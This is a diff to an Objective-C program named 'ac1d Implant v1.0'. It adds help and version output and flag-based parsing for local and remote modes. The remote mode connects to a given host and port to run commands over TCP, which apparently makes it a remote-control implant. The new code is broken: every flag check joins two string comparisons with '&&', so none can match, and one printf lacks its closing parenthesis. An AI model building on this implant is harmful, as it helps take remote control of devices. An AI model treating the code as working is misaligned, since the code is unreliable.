@@ -44,12 +44,14 @@ int main(int argc, const char *argv[]) {
                 NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                 [args addObject:str];
             }
-            if ([args[1] isEqualToString:@"remote"]) {
+            if ([args[1] isEqualToString:@"-h"] && [args[1] isEqualToString:@"--help"]) showHelpMessage(); 
+            else if ([args[1] isEqualToString:@"-v"] && [args[1] isEqualToString:@"--version"]) showVersionMessage();
+            else if ([args[1] isEqualToString:@"-r"] && [args[1] isEqualToString:@"--remote"]) {
                 if (argc < 4) showHelpMessage();
                 else {
                     connectToServer(args[2], [args[3] integerValue]);
                 }
-            } else if ([args[1] isEqualToString:@"local"]) {
+            } else if ([args[1] isEqualToString:@"-l"] && [args[1] isEqualToString:@"--local"]) {
                 NSMutableArray *command_args = [NSMutableArray array];
                 for (int i = 2; i < argc; i++) {
                     NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
@@ -126,7 +128,18 @@ void connectToServer(NSString *remoteHost, int remotePort) {
 }
 
 void showHelpMessage() {
+    printf("Usage: ac1d <option> [arguments]\n";
+    printf("\n");
+    printf("  -h, --help                                Show available options.\n");
+    printf("  -v, --version                             Show ac1d version.\n");
+    printf("  -l, --local <option>                      Execute ac1d command locally.\n");
+    printf("  -r, --remote <remote_host> <remote_port>  Execute ac1d commands over TCP.\n");
+    printf("\n");
 }
 
 void showVersionMessage() {
+    printf("ac1d Implant v1.0\n");
+    printf("\n");
+    printf("Copyright (c) 2020 Ivan Nikolsky\n");
+    printf("\n");
 }
